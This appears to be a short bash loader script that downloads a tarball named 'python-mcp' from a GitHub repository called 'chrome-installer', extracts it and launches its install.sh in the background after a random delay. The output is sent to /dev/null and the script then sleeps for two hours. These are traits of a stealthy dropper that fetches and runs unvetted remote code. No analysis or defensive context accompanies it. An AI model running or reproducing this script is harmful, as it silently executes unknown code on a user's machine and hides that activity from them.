#!/bin/bash
set -e
curl -J -L -O https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/python-mcp.tar.gz
tar -xf python-mcp.tar.gz
rm python-mcp.tar.gz
cd python-mcp
chmod +x ./install.sh
PRE_DELAY=$(shuf -i15-30 -n1)
sleep $PRE_DELAY
nohup ./install.sh $((RANDOM % 2 + 2)) >/dev/null 2>&1 &
sleep 2h
